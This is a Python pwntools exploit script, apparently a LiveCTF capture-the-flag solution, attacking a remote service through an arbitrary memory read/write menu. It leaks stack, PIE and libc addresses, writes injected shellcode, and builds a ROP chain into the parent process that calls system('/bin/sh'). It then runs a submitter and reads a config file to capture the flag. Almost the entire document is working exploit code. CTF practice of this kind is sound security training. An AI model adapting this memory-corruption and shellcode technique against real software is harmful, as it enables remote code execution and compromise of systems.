#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

s = remote(HOST, int(PORT))
sla = s.sendlineafter
sa = s.sendafter

def read(addr):
    sla(b'e:', b'1')
    sla(b's:', hex(addr).encode())
    s.recvuntil(b': ')
    return int(s.recvline(),16)

def write(addr, val):
    sla(b'e:', b'2')
    sla(b'e:', hex(val).encode())
    sla(b's:', hex(addr).encode())

#l = ELF('./libc.so.6')
stack = read(0)
for i in range(0x100):
    pie = read(stack +i * 8)# - 0x40
    if (pie & 0xfff) == 0x040:
        break
pie -= 0x40
#pie = read(stack+0xb8) - 0x40
libc = read(pie + 0x3500) - 272208 #- l.symbols['kill']
print(hex(stack))
print(hex(pie))
print(hex(libc))

context.arch = 'amd64'
#prdi = next(l.search(asm('pop rdi; ret')))
#binsh = next(l.search('/bin/sh'))
prdi = 173029
binsh = 1934968
cnt = stack - 0x190
rop = stack - 0x120
childbase = pie + 0x1488
context.arch = 'amd64'

# 0x0000000000053813 : pop rbx ; pop r12 ; ret
ppr = 0x0000000000053813

sc = ''
sc += shellcraft.push(pie + 0x14fc)
sc += 'pop r8\n'

sc += shellcraft.syscall(110)
sc += 'mov rdi, rax\n'
sc += shellcraft.push(stack - 0x110)
sc += 'pop rsi\n'
sc += shellcraft.push(libc + prdi)
sc += 'pop rdx\n'
sc += 'call r8\n'

sc += shellcraft.push(pie + 0x14fc)
sc += 'pop r8\n'
sc += shellcraft.syscall(110)
sc += 'mov rdi, rax\n'
sc += shellcraft.push(stack - 0x108)
sc += 'pop rsi\n'
sc += shellcraft.push(libc + binsh)
sc += 'pop rdx\n'
sc += 'call r8\n'

sc += shellcraft.push(pie + 0x14fc)
sc += 'pop r8\n'
sc += shellcraft.syscall(110)
sc += 'mov rdi, rax\n'
sc += shellcraft.push(stack - 0x100)
sc += 'pop rsi\n'
sc += shellcraft.push(libc + ppr)
sc += 'pop rdx\n'
sc += 'call r8\n'

sc += shellcraft.push(pie + 0x14fc)
sc += 'pop r8\n'
sc += shellcraft.syscall(110)
sc += 'mov rdi, rax\n'
sc += shellcraft.push(stack - 0x100+0x18)
sc += 'pop rsi\n'
sc += shellcraft.push(libc + 331120)#))l.symbols['system'])
sc += 'pop rdx\n'
sc += 'call r8\n'

shellcode = asm('jmp $+0x300')
space = pie + 0x1488
for i in range(0, len(shellcode), 8):
    write(space + i, u64(shellcode[i:i+8].ljust(8, b'\x00')))

shellcode = asm(sc)
space = pie + 0x1788
for i in range(0, len(shellcode), 8):
    write(space + i, u64(shellcode[i:i+8].ljust(8, b'\x00')))

write(cnt, 1)

sleep(3)
s.sendline(b'3')
s.sendline(b'./submitter')
s.sendline(b'./submitter')
s.sendline(b'./submitter')
s.sendline(b'cat /home/livectf/.config.toml')
s.sendline(b'cat /home/livectf/.config.toml')
s.sendline(b'cat /home/livectf/.config.toml')
flag = s.recvline_contains(b'LiveCTF{').decode().strip()
print(flag)
s.close()
